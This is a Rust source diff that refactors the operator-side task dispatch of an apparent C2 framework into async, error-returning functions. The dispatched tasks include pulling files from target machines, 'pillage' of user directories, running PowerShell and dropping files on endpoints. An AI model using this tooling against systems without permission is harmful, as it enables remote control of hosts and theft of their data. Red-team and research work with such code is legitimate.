@@ -1,63 +1,108 @@
-use std::mem::take;
+use std::{mem::take, sync::Arc};
 
+use axum::extract::State;
 use chrono::{DateTime, Utc};
 use shared::{
     pretty_print::{print_failed, print_success},
-    tasks::{AdminCommand, Command, FileDropMetadata},
+    tasks::{AdminCommand, FileDropMetadata},
 };
-use shared_c2_client::{NotificationsForAgents, command_to_string};
+use thiserror::Error;
 
 use crate::{
-    net::{IsTaskingAgent, api_request},
-    state::{Cli, TabConsoleMessages},
+    models::{AppState, TabConsoleMessages},
+    net::{ApiError, Credentials, IsTaskingAgent, IsTaskingAgentErr, api_request},
 };
 
-pub fn list_processes(cli: &Cli) {
-    if let Err(e) = api_request(
-        AdminCommand::ListProcesses,
-        IsTaskingAgent::Yes(&cli.uid),
-        &cli.credentials,
-    ) {
-        print_failed(format!("Failed to task ListProcesses on agent. {e}"));
-    }
+#[derive(Debug, Error)]
+pub enum TaskDispatchError {
+    #[error("API Error {0}.")]
+    Api(#[from] ApiError),
+    #[error("Bad tokens in input {0}")]
+    BadTokens(String),
+    #[error("Agent ID not present in task dispatch")]
+    AgentIdMissing(#[from] IsTaskingAgentErr),
+    #[error("Failed to deserialise data. {0}")]
+    DeserialisationError(#[from] serde_json::Error),
 }
 
-pub fn change_directory(cli: &Cli, new_dir: &[&str]) {
+pub async fn list_processes(
+    creds: &Credentials,
+    agent: &IsTaskingAgent<'_>,
+) -> Result<(), TaskDispatchError> {
+    agent.has_agent_id()?;
+
+    let _ = api_request(AdminCommand::ListProcesses, agent, creds, None).await?;
+
+    Ok(())
+}
+
+pub async fn change_directory(
+    new_dir: &[&str],
+    creds: &Credentials,
+    agent: &IsTaskingAgent<'_>,
+) -> Result<(), TaskDispatchError> {
+    agent.has_agent_id()?;
+
     let new_dir = new_dir.join(" ").trim().to_string();
 
-    if let Err(e) = api_request(
-        AdminCommand::Cd(new_dir),
-        IsTaskingAgent::Yes(&cli.uid),
-        &cli.credentials,
-    ) {
-        print_failed(format!("Failed to task Cd on agent. {e}"));
-    }
+    api_request(AdminCommand::Cd(new_dir), agent, creds, None).await?;
+
+    Ok(())
 }
 
-pub fn kill_agent(cli: &Cli) {
-    if let Err(e) = api_request(
-        AdminCommand::KillAgent,
-        IsTaskingAgent::Yes(&cli.uid),
-        &cli.credentials,
-    ) {
-        print_failed(format!("Failed to task KillAgent. {e}"));
+pub async fn kill_agent(
+    creds: &Credentials,
+    agent: &IsTaskingAgent<'_>,
+    state: State<Arc<AppState>>,
+) -> Result<(), TaskDispatchError> {
+    agent.has_agent_id()?;
+
+    api_request(AdminCommand::KillAgent, agent, creds, None).await?;
+
+    if let IsTaskingAgent::Yes(agent_id) = agent {
+        {
+            let mut agents_lock = state.connected_agents.write().await;
+            agents_lock.retain(|a| a.agent_id != agent_id.as_str());
+        }
+        {
+            let mut lock = state.active_tabs.write().await;
+            let pos = lock.1.iter().position(|a| a == *agent_id);
+            if let Some(pos) = pos {
+                // Do not remove index 0
+                if pos > 0 {
+                    lock.1.remove(pos);
+                    lock.0 = lock.0.saturating_sub(1);
+                }
+            }
+        }
     }
+    Ok(())
 }
 
-pub fn kill_process(cli: &Cli, pid: &&str) {
+pub async fn kill_process(
+    creds: &Credentials,
+    agent: &IsTaskingAgent<'_>,
+    pid: &&str,
+) -> Result<(), TaskDispatchError> {
+    agent.has_agent_id()?;
+
     // Validate, even through we pass a String - check it client side
     let pid_as_int: i32 = pid.parse().unwrap_or(0);
     if pid.is_empty() || pid_as_int == 0 {
-        print_failed(format!("No pid or non-numeric supplied."));
+        return Err(TaskDispatchError::BadTokens(
+            "No pid or non-numeric supplied.".into(),
+        ));
     }
 
-    if let Err(e) = api_request(
+    api_request(
         AdminCommand::KillProcessById(pid.to_string()),
-        IsTaskingAgent::Yes(&cli.uid),
-        &cli.credentials,
-    ) {
-        print_failed(format!("Failed to task KillAgent. {e}"));
-    }
+        agent,
+        creds,
+        None,
+    )
+    .await?;
+
+    Ok(())
 }
 
 /// Dispatching function for instructing the agent to copy a file.
@@ -65,7 +110,13 @@ pub fn kill_process(cli: &Cli, pid: &&str) {
 /// # Args
 /// - `from`: Where to copy from
 /// - `to`: Where to copy to`
-pub fn copy_file(cli: &Cli, raw_input: String) {
+pub async fn copy_file(
+    raw_input: String,
+    creds: &Credentials,
+    agent: &IsTaskingAgent<'_>,
+) -> Result<(), TaskDispatchError> {
+    agent.has_agent_id()?;
+
     let (from, to) = match split_string_slices_to_n(2, &raw_input, DiscardFirst::Chop) {
         Some(mut inner) => {
             let from = take(&mut inner[0]);
@@ -73,19 +124,15 @@ pub fn copy_file(cli: &Cli, raw_input: String) {
             (from, to)
         }
         None => {
-            cli.write_console_error(&cli.uid, "Could not get data from tokens.");
-            return;
+            return Err(TaskDispatchError::BadTokens(
+                "Could not get data from tokens in copy_file.".into(),
+            ));
         }
     };
 
-    if let Err(e) = api_request(
-        AdminCommand::Copy((from, to)),
-        IsTaskingAgent::Yes(&cli.uid),
-        &cli.credentials,
-    ) {
-        cli.write_console_error(&cli.uid, format!("Failed to task Copy. {e}"));
-        return;
-    }
+    api_request(AdminCommand::Copy((from, to)), agent, creds, None).await?;
+
+    Ok(())
 }
 
 /// Dispatching function for instructing the agent to copy a file.
@@ -93,7 +140,12 @@ pub fn copy_file(cli: &Cli, raw_input: String) {
 /// # Args
 /// - `from`: Where to copy from
 /// - `to`: Where to copy to`
-pub fn move_file(cli: &Cli, raw_input: String) {
+pub async fn move_file(
+    raw_input: String,
+    creds: &Credentials,
+    agent: &IsTaskingAgent<'_>,
+) -> Result<(), TaskDispatchError> {
+    agent.has_agent_id()?;
     let (from, to) = match split_string_slices_to_n(2, &raw_input, DiscardFirst::Chop) {
         Some(mut inner) => {
             let from = take(&mut inner[0]);
@@ -101,23 +153,31 @@ pub fn move_file(cli: &Cli, raw_input: String) {
             (from, to)
         }
         None => {
-            cli.write_console_error(&cli.uid, "Could not get data from tokens.");
-            return;
+            return Err(TaskDispatchError::BadTokens(
+                "Could not get data from tokens in move_file.".into(),
+            ));
         }
     };
 
-    if let Err(e) = api_request(
+    api_request(
         AdminCommand::Move((from.to_string(), to.to_string())),
-        IsTaskingAgent::Yes(&cli.uid),
-        &cli.credentials,
-    ) {
-        cli.write_console_error(&cli.uid, "Failed to task Move.");
-        return;
-    }
+        agent,
+        creds,
+        None,
+    )
+    .await?;
+
+    Ok(())
 }
 
 /// Pull a single file from the target machine
-pub fn pull_file(cli: &Cli, target: String) {
+pub async fn pull_file(
+    target: String,
+    creds: &Credentials,
+    agent: &IsTaskingAgent<'_>,
+) -> Result<(), TaskDispatchError> {
+    agent.has_agent_id()?;
+
     if target.is_empty() {
         print_failed(format!("Please specify a target file."));
     }
@@ -125,28 +185,41 @@ pub fn pull_file(cli: &Cli, target: String) {
     let target = match split_string_slices_to_n(1, &target, DiscardFirst::Chop) {
         Some(mut inner) => take(&mut inner[0]),
         None => {
-            cli.write_console_error(&cli.uid, "Could not get data from tokens.");
-            return;
+            return Err(TaskDispatchError::BadTokens(
+                "Could not get data from tokens in pull_file.".into(),
+            ));
         }
     };
 
-    if let Err(e) = api_request(
-        AdminCommand::Pull(target.to_string()),
-        IsTaskingAgent::Yes(&cli.uid),
-        &cli.credentials,
-    ) {
-        print_failed(format!("Failed to task Move. {e}"));
-    }
+    api_request(AdminCommand::Pull(target.to_string()), agent, creds, None).await?;
+
+    Ok(())
 }
 
-pub fn remove_agent(cli: &Cli) {
-    if let Err(e) = api_request(
-        AdminCommand::RemoveAgentFromList,
-        IsTaskingAgent::Yes(&cli.uid),
-        &cli.credentials,
-    ) {
-        print_failed(format!("Failed to task Cd on agent. {e}"));
+pub async fn remove_agent(
+    creds: &Credentials,
+    agent: &IsTaskingAgent<'_>,
+    state: State<Arc<AppState>>,
+) -> Result<(), TaskDispatchError> {
+    agent.has_agent_id()?;
+    api_request(AdminCommand::RemoveAgentFromList, &agent, creds, None).await?;
+
+    // Remove agent from connected_agents
+    if let IsTaskingAgent::Yes(agent_id) = agent {
+        let mut agents_lock = state.connected_agents.write().await;
+        agents_lock.retain(|a| a.agent_id != agent_id.as_str());
+        // Remove tab
+        let mut lock = state.active_tabs.write().await;
+        let pos = lock.1.iter().position(|a| a == *agent_id);
+        if let Some(pos) = pos {
+            // Do not remove index 0
+            if pos > 0 {
+                lock.1.remove(pos);
+                lock.0 = lock.0.saturating_sub(1);
+            }
+        }
     }
+    Ok(())
 }
 
 pub fn exit() {
@@ -154,22 +227,29 @@ pub fn exit() {
     std::process::exit(0);
 }
 
-pub fn unknown_command(cli: &mut Cli) {
-    cli.write_console_error(&cli.uid, "Unknown command or you did not supply the correct number of arguments. Type \"help {command}\" \
-            to see the instructions for that command.");
-
+pub fn unknown_command() -> Result<(), TaskDispatchError> {
     print_failed(
         "Unknown command or you did not supply the correct number of arguments. Type \"help {command}\" \
         to see the instructions for that command.",
     );
+
+    Err(TaskDispatchError::BadTokens("Unknown command or you did not supply the correct number of arguments. Type \"help {command}\" \
+            to see the instructions for that command.".into()))
 }
 
-pub fn set_sleep(sleep_time: &str, cli: &Cli) {
+pub async fn set_sleep(
+    sleep_time: &str,
+    creds: &Credentials,
+    agent: &IsTaskingAgent<'_>,
+) -> Result<(), TaskDispatchError> {
+    agent.has_agent_id()?;
+
     let sleep_time: i64 = match sleep_time.parse() {
         Ok(s) => s,
         Err(e) => {
-            print_failed(format!("Could not parse new sleep time. {e}"));
-            return;
+            return Err(TaskDispatchError::BadTokens(format!(
+                "Could not parse new sleep time. {e}"
+            )));
         }
     };
 
@@ -178,139 +258,99 @@ pub fn set_sleep(sleep_time: &str, cli: &Cli) {
     // denial of service or other errors. We check the input number is not less than or = to 0.
     // We do not need to check the upper bound because an i64 MAX will fit into a u64.
     if sleep_time <= 0 {
-        print_failed("Sleep time must be greater than 1 (second)");
-        return;
-    }
-
-    if let Err(e) = api_request(
-        AdminCommand::Sleep(sleep_time),
-        IsTaskingAgent::Yes(&cli.uid),
-        &cli.credentials,
-    ) {
-        print_failed(format!("Failed to set sleep time on agent. {e}"));
-    }
-}
-
-pub fn pull_notifications_for_agent(cli: &mut Cli) {
-    let result = match api_request(
-        AdminCommand::PullNotifications,
-        IsTaskingAgent::Yes(&cli.uid),
-        &cli.credentials,
-    ) {
-        Ok(r) => r,
-        Err(e) => {
-            print_failed(format!("Failed to task PullNotifications on agent. {e}"));
-            return;
-        }
-    };
-
-    let serialised_response: NotificationsForAgents = match serde_json::from_slice(&result) {
-        Ok(ser) => match ser {
-            Some(notifs) => notifs,
-            None => return,
-        },
-        Err(e) => {
-            print_failed(format!("Could not deserialise notifications on agent. {e}"));
-            return;
-        }
-    };
-
-    let mut write_lock = cli.connected_agents.write().unwrap();
-    let agent = match write_lock.as_mut() {
-        Some(agent) => agent.get_mut(&cli.uid).unwrap(),
-        None => return,
-    };
-
-    for item in serialised_response {
-        let result = Some(item.format_console_output());
-        let cmd = Command::from_u32(item.command_id as _);
-        let cmd_string = command_to_string(&cmd);
-
-        agent.output_messages.push(TabConsoleMessages {
-            event: cmd_string,
-            time: item.time_completed.to_string(),
-            messages: result,
-        });
-    }
-}
-
-pub fn clear_terminal(cli: &mut Cli) {
-    let mut lock = cli.connected_agents.write().unwrap();
-    let agent = lock.as_mut().unwrap().get_mut(&cli.uid).unwrap();
-    agent.output_messages.clear();
-}
-
-pub fn pwd(cli: &Cli) {
-    let _result = match api_request(
-        AdminCommand::Pwd,
-        IsTaskingAgent::Yes(&cli.uid),
-        &cli.credentials,
-    ) {
-        Ok(r) => r,
-        Err(e) => {
-            print_failed(format!("Failed to task PullNotifications on agent. {e}"));
-            return;
-        }
-    };
-}
-
-pub fn dir_listing(cli: &Cli) {
-    if let Err(e) = api_request(
-        AdminCommand::Ls,
-        IsTaskingAgent::Yes(&cli.uid),
-        &cli.credentials,
-    ) {
-        print_failed(format!("Failed to task Ls on agent. {e}"));
-    }
-}
-
-pub fn show_server_time(cli: &Cli) {
-    let result = match api_request(
-        AdminCommand::ShowServerTime,
-        IsTaskingAgent::No,
-        &cli.credentials,
-    ) {
-        Ok(r) => r,
-        Err(e) => {
-            print_failed(format!("Failed to task PullNotifications on agent. {e}"));
-            return;
-        }
-    };
-
-    let deserialised_response: DateTime<Utc> = match serde_json::from_slice(&result) {
-        Ok(ser) => match ser {
-            Some(time) => time,
-            None => return,
-        },
-        Err(e) => {
-            print_failed(format!("Could not deserialise server time. {e}"));
-            return;
-        }
-    };
-
-    let mut lock = cli.connected_agents.write().unwrap();
-    let agent = lock.as_mut().unwrap().get_mut(&cli.uid).unwrap();
-    agent
-        .output_messages
-        .push(TabConsoleMessages::non_agent_message(
-            "ServerTime".into(),
-            deserialised_response.to_string(),
+        return Err(TaskDispatchError::BadTokens(
+            "Sleep time must be greater than 1 (second)".into(),
         ));
+    }
+
+    api_request(AdminCommand::Sleep(sleep_time), agent, creds, None).await?;
+
+    Ok(())
 }
 
-pub fn pillage(cli: &Cli) {
-    if let Err(e) = api_request(
-        AdminCommand::ListUsersDirs,
-        IsTaskingAgent::Yes(&cli.uid),
-        &cli.credentials,
-    ) {
-        print_failed(format!("Failed to task ListUsersDirs on agent. {e}"));
+/// Clears the terminal of the selected tab / agent for the operator. This does not clear the database.
+pub async fn clear_terminal(
+    agent: &IsTaskingAgent<'_>,
+    state: State<Arc<AppState>>,
+) -> Result<(), TaskDispatchError> {
+    if let IsTaskingAgent::Yes(agent_id) = agent {
+        let mut lock = state.connected_agents.write().await;
+
+        if let Some(agent_obj) = lock
+            .iter_mut()
+            .find(|a: &&mut crate::models::Agent| a.agent_id == **agent_id)
+        {
+            agent_obj.output_messages.clear();
+        }
     }
+
+    Ok(())
+}
+
+pub async fn pwd(creds: &Credentials, agent: &IsTaskingAgent<'_>) -> Result<(), TaskDispatchError> {
+    agent.has_agent_id()?;
+
+    api_request(AdminCommand::Pwd, agent, creds, None).await?;
+
+    Ok(())
+}
+
+pub async fn dir_listing(
+    creds: &Credentials,
+    agent: &IsTaskingAgent<'_>,
+) -> Result<(), TaskDispatchError> {
+    agent.has_agent_id()?;
+
+    api_request(AdminCommand::Ls, agent, creds, None).await?;
+
+    Ok(())
+}
+
+pub async fn show_server_time(
+    creds: &Credentials,
+    state: State<Arc<AppState>>,
+) -> Result<(), TaskDispatchError> {
+    let result = api_request(
+        AdminCommand::ShowServerTime,
+        &IsTaskingAgent::No,
+        creds,
+        None,
+    )
+    .await?;
+
+    let deserialised_response: DateTime<Utc> = serde_json::from_slice(&result)?;
+
+    let mut lock = state.connected_agents.write().await;
+
+    if let Some(server_tab) = lock.get_mut(0) {
+        server_tab
+            .output_messages
+            .push(TabConsoleMessages::non_agent_message(
+                "ServerTime".into(),
+                deserialised_response.to_string(),
+            ));
+    }
+
+    Ok(())
+}
+
+pub async fn pillage(
+    creds: &Credentials,
+    agent: &IsTaskingAgent<'_>,
+) -> Result<(), TaskDispatchError> {
+    agent.has_agent_id()?;
+
+    api_request(AdminCommand::ListUsersDirs, agent, creds, None).await?;
+
+    Ok(())
 }
 
 /// Show the help menu to the user
-pub fn show_help(cli: &mut Cli) {
-    let messages: Option<Vec<String>> = Some(vec![
+pub async fn show_help(
+    agent: &IsTaskingAgent<'_>,
+    state: State<Arc<AppState>>,
+) -> Result<(), TaskDispatchError> {
+    let messages: Vec<String> = vec![
         "help [command]".into(),
         "exit (Exit's the client)".into(),
         "servertime (Shows the local time of the server)".into(),
@@ -331,20 +371,32 @@ pub fn show_help(cli: &mut Cli) {
         "run".into(),
         "kill <pid>".into(),
         "drop <server recognised name> <filename to drop on disk (including extension)>".into(),
-    ]);
+    ];
 
-    let mut lock = cli.connected_agents.write().unwrap();
-    let agent = lock.as_mut().unwrap().get_mut(&cli.uid).unwrap();
+    if let IsTaskingAgent::Yes(agent_id) = agent {
+        let mut lock = state.connected_agents.write().await;
 
-    agent.output_messages.push(TabConsoleMessages {
-        event: "HelpMenu".into(),
-        time: "-".into(),
-        messages,
-    });
+        if let Some(agent_obj) = lock
+            .iter_mut()
+            .find(|a: &&mut crate::models::Agent| a.agent_id == **agent_id)
+        {
+            agent_obj.output_messages.push(TabConsoleMessages {
+                event: "HelpMenu".into(),
+                time: "-".into(),
+                messages,
+            });
+        }
+    }
+
+    Ok(())
 }
 
 /// Shows help for a specified command where further details are available
-pub fn show_help_for_command(cli: &mut Cli, command: &str) {
+pub async fn show_help_for_command(
+    agent: &IsTaskingAgent<'_>,
+    state: State<Arc<AppState>>,
+    command: &str,
+) -> Result<(), TaskDispatchError> {
     let messages: Vec<String> = match command {
         "drop" => vec![
             "Drops a file to disk. The file dropped must be staged on the C2 first, otherwise the process will not complete.".into(),
@@ -364,17 +416,31 @@ pub fn show_help_for_command(cli: &mut Cli, command: &str) {
         _ => vec!["No help pages available for this command, or it does not exist.".into()],
     };
 
-    let mut lock = cli.connected_agents.write().unwrap();
-    let agent = lock.as_mut().unwrap().get_mut(&cli.uid).unwrap();
+    if let IsTaskingAgent::Yes(agent_id) = agent {
+        let mut lock = state.connected_agents.write().await;
 
-    agent.output_messages.push(TabConsoleMessages {
-        event: "HelpMenu".into(),
-        time: "-".into(),
-        messages: Some(messages),
-    });
+        if let Some(agent_obj) = lock
+            .iter_mut()
+            .find(|a: &&mut crate::models::Agent| a.agent_id == **agent_id)
+        {
+            agent_obj.output_messages.push(TabConsoleMessages {
+                event: "HelpMenu".into(),
+                time: "-".into(),
+                messages,
+            });
+        }
+    }
+
+    Ok(())
 }
 
-pub fn run_powershell_command(cli: &Cli, args: &[&str]) {
+pub async fn run_powershell_command(
+    args: &[&str],
+    creds: &Credentials,
+    agent: &IsTaskingAgent<'_>,
+) -> Result<(), TaskDispatchError> {
+    agent.has_agent_id()?;
+
     let mut args_string: String = String::new();
     for arg in args {
         args_string += arg;
@@ -383,24 +449,23 @@ pub fn run_powershell_command(cli: &Cli, args: &[&str]) {
 
     let args_trimmed = args_string.trim().to_string();
 
-    if let Err(e) = api_request(
-        AdminCommand::Run(args_trimmed),
-        IsTaskingAgent::Yes(&cli.uid),
-        &cli.credentials,
-    ) {
-        cli.write_console_error(&cli.uid, &format!("Failed to task Run on agent. {e}"));
-        print_failed(format!("Failed to task Run on agent. {e}"));
-    }
+    api_request(AdminCommand::Run(args_trimmed), agent, creds, None).await?;
+
+    Ok(())
 }
 
 /// Instructs the agent to drop a staged file onto disk on the target endpoint.
-pub fn file_dropper(cli: &Cli, args: &[&str]) {
+pub async fn file_dropper(
+    args: &[&str],
+    creds: &Credentials,
+    agent: &IsTaskingAgent<'_>,
+) -> Result<(), TaskDispatchError> {
+    agent.has_agent_id()?;
+
     if args.len() != 2 {
-        cli.write_console_error(
-            &cli.uid,
-            "Invalid number of args passed into the `drop` command.",
-        );
-        return;
+        return Err(TaskDispatchError::BadTokens(
+            "Invalid number of args passed into the `drop` command.".into(),
+        ));
     }
 
     let file_data = unsafe {
@@ -412,13 +477,9 @@ pub fn file_dropper(cli: &Cli, args: &[&str]) {
         }
     };
 
-    if let Err(e) = api_request(
-        AdminCommand::Drop(file_data),
-        IsTaskingAgent::Yes(&cli.uid),
-        &cli.credentials,
-    ) {
-        cli.write_console_error(&cli.uid, &format!("Failed to task Drop on agent. {e}"));
-    }
+    api_request(AdminCommand::Drop(file_data), agent, creds, None).await?;
+
+    Ok(())
 }
 
 /// Determines whether the [`split_string_slices_to_n`] function should discard the first
